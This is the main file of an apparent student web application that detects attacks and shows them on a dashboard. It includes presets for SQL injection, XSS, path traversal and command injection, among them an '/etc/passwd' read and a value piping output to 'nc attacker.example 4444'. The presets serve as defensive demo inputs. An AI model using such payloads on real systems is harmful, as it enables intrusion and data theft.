from fastapi import FastAPI
from middleware import SecurityMiddleware
from fastapi.responses import HTMLResponse
from ui import layout
import api
import os
from db import ensure_schema

app = FastAPI(title="Security Monitoring System", docs_url="/swagger")

app.add_middleware(SecurityMiddleware)

app.include_router(api.router, prefix="/api")

ENABLE_VULN_SIMULATION = os.getenv("ENABLE_VULN_SIMULATION", "false").lower() == "true"

if ENABLE_VULN_SIMULATION:
    import vulnerable
    app.include_router(vulnerable.router, prefix="/vuln")


@app.on_event("startup")
def startup():
    ensure_schema()


@app.get("/", response_class=HTMLResponse)
def root():
    return layout("""
        <h1>Security Monitoring System</h1>
        <div class="card">
            <p>Real-time backend security monitoring and threat simulation platform.</p>
            <p>This demo uses preset request payloads, active defense responses, and a live dashboard timeline so attack events can be shown without typing JSON during presentation.</p>
            <div style="display:flex;gap:10px;flex-wrap:wrap;margin-top:12px;">
                <a href="/analyze" style="padding:10px 14px;border-radius:8px;background:#22c55e;color:#052e16;font-weight:700;text-decoration:none;">Open Analyze Demo</a>
                <a href="/dashboard" style="padding:10px 14px;border-radius:8px;background:#38bdf8;color:#082f49;font-weight:700;text-decoration:none;">Open Live Dashboard</a>
            </div>
        </div>
    """)


@app.get("/docs", response_class=HTMLResponse)
def docs_page():
    return layout("""
        <h2>API Documentation</h2>
        <div class="card">
            <iframe src="/swagger" title="Swagger Docs" style="width:100%;height:80vh;border:none;border-radius:8px;background:white;"></iframe>
        </div>
    """)


@app.get("/analyze", response_class=HTMLResponse)
def analyze_page():
    return layout("""
        <h2>Analyze a Request</h2>
        <div class="card">
            <p>Choose a preset payload, run the analysis, and review the defense response. These buttons use the same <code>/api/analyze</code> endpoint as the API tests.</p>
            <div style="display:flex;gap:10px;flex-wrap:wrap;margin-bottom:12px;">
                <button class="preset" data-kind="normal" style="padding:9px 12px;border-radius:8px;border:none;background:#22c55e;color:#052e16;font-weight:700;cursor:pointer;">Normal</button>
                <button class="preset" data-kind="sql" style="padding:9px 12px;border-radius:8px;border:none;background:#ef4444;color:white;font-weight:700;cursor:pointer;">SQL Injection</button>
                <button class="preset" data-kind="xss" style="padding:9px 12px;border-radius:8px;border:none;background:#f97316;color:white;font-weight:700;cursor:pointer;">XSS</button>
                <button class="preset" data-kind="path" style="padding:9px 12px;border-radius:8px;border:none;background:#f59e0b;color:#422006;font-weight:700;cursor:pointer;">Path Traversal</button>
                <button class="preset" data-kind="cmd" style="padding:9px 12px;border-radius:8px;border:none;background:#dc2626;color:white;font-weight:700;cursor:pointer;">Command Injection</button>
                <button class="preset" data-kind="recursive" style="padding:9px 12px;border-radius:8px;border:none;background:#8b5cf6;color:white;font-weight:700;cursor:pointer;">Recursive Abuse</button>
                <button class="preset" data-kind="flood" style="padding:9px 12px;border-radius:8px;border:none;background:#0f766e;color:white;font-weight:700;cursor:pointer;">Flood Payload</button>
            </div>
            <p id="preset-note" style="opacity:.85;margin-top:0;">Each button rotates through multiple examples, like a small attack conveyor belt.</p>
            <textarea id="payload" style="width:100%;min-height:180px;padding:12px;border-radius:8px;border:1px solid #334155;background:#0b1220;color:#e2e8f0;">{"path":"/login","method":"POST","payload":{"username":"admin","password":"password123"}}</textarea>
            <div style="margin-top:12px;display:flex;gap:10px;align-items:center;">
                <button id="run" style="padding:10px 14px;border-radius:8px;border:none;background:#22c55e;color:#052e16;font-weight:700;cursor:pointer;">Analyze</button>
                <span id="status" style="opacity:.85;"></span>
            </div>
        </div>
        <div id="defense-card" class="card" style="display:none;"></div>
        <div class="card">
            <h3 style="margin-top:0;">Result</h3>
            <pre id="result" style="white-space:pre-wrap;"></pre>
        </div>

        <script>
          const btn = document.getElementById("run");
          const statusEl = document.getElementById("status");
          const payloadEl = document.getElementById("payload");
          const resultEl = document.getElementById("result");
          const defenseCard = document.getElementById("defense-card");
          const presetNote = document.getElementById("preset-note");
          const presetIndexes = {};
          const presets = {
            normal: [
              {"path":"/login","method":"POST","payload":{"username":"student","password":"normal-password"}},
              {"path":"/profile/update","method":"POST","payload":{"display_name":"Alex Student","email":"student@example.com"}},
              {"path":"/products/search","method":"GET","payload":{"query":"wireless mouse","page":1}}
            ],
            sql: [
              {"path":"/login","method":"POST","payload":{"username":"admin' OR '1'='1","password":"x"}},
              {"path":"/users","method":"GET","payload":{"id":"1 UNION SELECT username,password FROM users"}},
              {"path":"/orders","method":"POST","payload":{"order_id":"42; DROP TABLE orders;--"}}
            ],
            xss: [
              {"path":"/comment","method":"POST","payload":{"message":"<img src=x onerror=alert(1)>"}},
              {"path":"/profile/update","method":"POST","payload":{"bio":"javascript:alert(1)"}},
              {"path":"/feedback","method":"POST","payload":{"message":"hello <svg onload=alert(1)>"}}
            ],
            path: [
              {"path":"/files/../../../etc/passwd","method":"GET","payload":{}},
              {"path":"/download","method":"POST","payload":{"file":"../../../../var/log/auth.log"}},
              {"path":"/static","method":"GET","payload":{"template":"..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts"}}
            ],
            cmd: [
              {"path":"/run","method":"POST","payload":{"command":"status; cat /etc/passwd"}},
              {"path":"/ping","method":"POST","payload":{"host":"127.0.0.1 && whoami"}},
              {"path":"/backup","method":"POST","payload":{"target":"main | nc attacker.example 4444"}}
            ],
            recursive: [
              {"path":"/api/recursive/status","method":"GET","payload":{"next":"/api/recursive/status","depth":25}},
              {"path":"/api/loop","method":"POST","payload":{"callback":"/api/loop","repeat":100}},
              {"path":"/crawler/start","method":"POST","payload":{"seed":"/crawler/start","max_depth":999}}
            ],
            flood: [
              {"path":"/upload","method":"POST","payload":{"blob":"A".repeat(6000)}},
              {"path":"/bulk/import","method":"POST","payload":{"records":"B".repeat(8000)}},
              {"path":"/message","method":"POST","payload":{"body":"C".repeat(7000)}}
            ]
          };

          function setStatus(text) { statusEl.textContent = text || ""; }
          function colorFor(severity) {
            return {
              low: ["#14532d", "#bbf7d0"],
              medium: ["#713f12", "#fef3c7"],
              high: ["#9a3412", "#ffedd5"],
              critical: ["#7f1d1d", "#fee2e2"]
            }[severity] || ["#334155", "#e2e8f0"];
          }
          function renderDefense(data) {
            const defense = data.defense || {};
            const colors = colorFor(defense.severity);
            defenseCard.style.display = "block";
            defenseCard.style.background = colors[0];
            defenseCard.style.color = colors[1];
            const requestId = data.request_id || "not stored";
            defenseCard.innerHTML = `
              <h3 style="margin-top:0;">${String(defense.action || "review").toUpperCase()} - ${String(defense.severity || "unknown").toUpperCase()}</h3>
              <p><strong>Rule:</strong> ${defense.rule || "No rule returned"}</p>
              <p><strong>Reason:</strong> ${defense.reason || "No reason returned"}</p>
              <p><strong>Recommendation:</strong> ${defense.recommendation || "No recommendation returned"}</p>
              <button id="review-defense" style="padding:8px 11px;border-radius:8px;border:none;cursor:pointer;">Review Defense</button>
            `;
            document.getElementById("review-defense").addEventListener("click", () => {
              alert(`Analyst review for Request ID: ${requestId}

What the professor should see you do:
1. Confirm if the payload is a true attack or a false positive.
2. Explain the rule that fired and why the severity makes sense.
3. Check the dashboard timeline to prove the event was recorded.
4. State the response: allow, monitor, throttle, sanitize, or block.
5. Mention the fix, such as validation, parameterized SQL, escaping output, or rate limiting.`);
            });
          }
          document.querySelectorAll(".preset").forEach((button) => {
            button.addEventListener("click", () => {
              const kind = button.dataset.kind;
              presetIndexes[kind] = presetIndexes[kind] || 0;
              const examples = presets[kind];
              const example = examples[presetIndexes[kind] % examples.length];
              presetIndexes[kind] += 1;
              payloadEl.value = JSON.stringify(example, null, 2);
              presetNote.textContent = `${button.textContent} example ${presetIndexes[kind]} loaded. Press the same button again for the next example.`;
              setStatus(`${button.textContent} payload loaded.`);
            });
          });

          btn.addEventListener("click", async () => {
            resultEl.textContent = "";
            defenseCard.style.display = "none";

            let payload;
            try {
              payload = JSON.parse(payloadEl.value);
            } catch (e) {
              setStatus("Invalid JSON in the textarea.");
              return;
            }

            setStatus("Analyzing…");
            try {
              const res = await fetch("/api/analyze", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload),
              });

              const text = await res.text();
              let data;
              try { data = JSON.parse(text); } catch { data = text; }

              resultEl.textContent = typeof data === "string" ? data : JSON.stringify(data, null, 2);
              if (typeof data !== "string" && data.defense) renderDefense(data);
              setStatus(res.ok ? "Done." : `Error: HTTP ${res.status}`);
            } catch (e) {
              setStatus("Request failed (is the server running?).");
              resultEl.textContent = String(e);
            }
          });
        </script>
    """)


@app.get("/dashboard", response_class=HTMLResponse)
def dashboard_page():
    return layout("""
        <h2>Live Security Dashboard</h2>
        <div class="card">
            <div><strong>Total requests (24h):</strong> <span id="total">-</span></div>
            <div><strong>Anomaly requests (24h):</strong> <span id="anomalies">-</span></div>
        </div>
        <div class="card">
            <h3 style="margin-top:0;">Attack Timeline - Last 60 Minutes</h3>
            <p style="margin-top:0;opacity:.85;">Each bar is one minute. Green = normal requests, yellow/orange/red = detected attacks by severity. The chart refreshes every four seconds.</p>
            <canvas id="timeline" height="110"></canvas>
            <pre id="timeline-detail" style="white-space:pre-wrap;margin-top:12px;">Click a bar to inspect the events in that minute.</pre>
        </div>
        <div class="card">
            <h3 style="margin-top:0;">Top IPs (24h)</h3>
            <pre id="ips">Loading...</pre>
        </div>
        <div class="card">
            <h3 style="margin-top:0;">Recent Requests</h3>
            <pre id="recent">Loading...</pre>
        </div>
        <div class="card">
            <h3 style="margin-top:0;">Recent Anomalies</h3>
            <pre id="anomaly-list">Loading...</pre>
        </div>
        <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
        <script>
          let timelineChart;
          function renderTimeline(items) {
            const ctx = document.getElementById("timeline");
            const buckets = {};
            items.forEach((item) => {
              const date = new Date(item.time);
              if (Number.isNaN(date.getTime())) return;
              const key = date.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" });
              if (!buckets[key]) {
                buckets[key] = { normal: 0, medium: 0, high: 0, critical: 0, events: [] };
              }
              const severity = item.severity || "low";
              if (severity === "critical") buckets[key].critical += 1;
              else if (severity === "high") buckets[key].high += 1;
              else if (severity === "medium") buckets[key].medium += 1;
              else buckets[key].normal += 1;
              buckets[key].events.push(item);
            });
            const labels = Object.keys(buckets);
            if (timelineChart) timelineChart.destroy();
            timelineChart = new Chart(ctx, {
              type: "bar",
              data: {
                labels,
                datasets: [
                  { label: "Normal", data: labels.map((label) => buckets[label].normal), backgroundColor: "#22c55e" },
                  { label: "Medium", data: labels.map((label) => buckets[label].medium), backgroundColor: "#facc15" },
                  { label: "High", data: labels.map((label) => buckets[label].high), backgroundColor: "#f97316" },
                  { label: "Critical", data: labels.map((label) => buckets[label].critical), backgroundColor: "#ef4444" }
                ]
              },
              options: {
                responsive: true,
                plugins: {
                  legend: { labels: { color: "#e2e8f0" } },
                  tooltip: {
                    callbacks: {
                      afterBody: (context) => {
                        const label = context[0].label;
                        return buckets[label].events.map((event) => `${event.method} ${event.endpoint} - ${event.anomaly_type}`);
                      }
                    }
                  }
                },
                scales: {
                  x: { stacked: true, ticks: { color: "#e2e8f0" }, grid: { color: "#334155" } },
                  y: {
                    stacked: true,
                    beginAtZero: true,
                    ticks: { color: "#e2e8f0", precision: 0 },
                    grid: { color: "#334155" },
                    title: { display: true, text: "Requests per minute", color: "#e2e8f0" }
                  }
                },
                onClick: (evt, active) => {
                  if (!active.length) return;
                  const label = timelineChart.data.labels[active[0].index];
                  document.getElementById("timeline-detail").textContent = JSON.stringify(buckets[label].events, null, 2);
                }
              }
            });
          }
          async function refresh() {
            try {
              const res = await fetch("/api/dashboard/metrics");
              const data = await res.json();
              document.getElementById("total").textContent = String(data.total_requests_24h);
              document.getElementById("anomalies").textContent = String(data.anomaly_requests_24h);
              document.getElementById("ips").textContent = JSON.stringify(data.top_ips_24h, null, 2);
              document.getElementById("recent").textContent = JSON.stringify(data.recent_requests, null, 2);
              document.getElementById("anomaly-list").textContent = JSON.stringify(data.recent_anomalies, null, 2);
              renderTimeline(data.timeline || []);
            } catch (e) {
              document.getElementById("recent").textContent = String(e);
            }
          }
          refresh();
          setInterval(refresh, 4000);
        </script>
    """)